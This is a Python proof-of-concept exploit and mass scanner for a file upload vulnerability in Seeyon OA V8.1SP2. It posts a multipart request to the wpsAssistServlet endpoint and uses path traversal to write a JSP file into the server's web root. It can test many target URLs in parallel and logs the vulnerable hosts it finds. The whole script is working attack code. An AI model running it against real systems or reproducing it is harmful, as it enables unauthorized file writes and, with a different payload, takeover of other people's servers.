import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool
def banner():
    test = """test"""
    print(test)

def poc(target):
    try:
        payload = "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2"
        data = """--59229605f98b8cf290a7b8908b34616b
    Content-Disposition: form-data; name="upload"; filename="123.xls"
    Content-Type: application/vnd.ms-excel

        <% out.println("seeyon_vuln");%>
        --59229605f98b8cf290a7b8908b34616b--
        """
        headers = {
            "Content-Type":"multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b",
            "Accept-Encoding":"gzip"
        }
        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
        }
        res1 = requests.get(url=target, verify=False, timeout=15)
        if res1.status_code == 200:
            # print(res1.text)
            res2 = requests.post(target+payload, verify=False,timeout=15,data=data,headers=headers,proxies=proxies)
            # print(res2.text)
            if res2.status_code ==200:
                print(f"[+]{target}存在漏洞")
                # print(res2.text)
                with open ("致远OA_result.txt","a",encoding="utf-8") as f:
                    f.write(f"[+]该{target}存在漏洞\n")
            else:
                print(f"[-]该{target}不存在漏洞")
    except Exception as e:
        print(f"[-]{target}可能存在问题")


def main():
    banner()
    parser =argparse.ArgumentParser(description="致远OA_V8.1SP2文件上传漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
if __name__ == '__main__':
    main()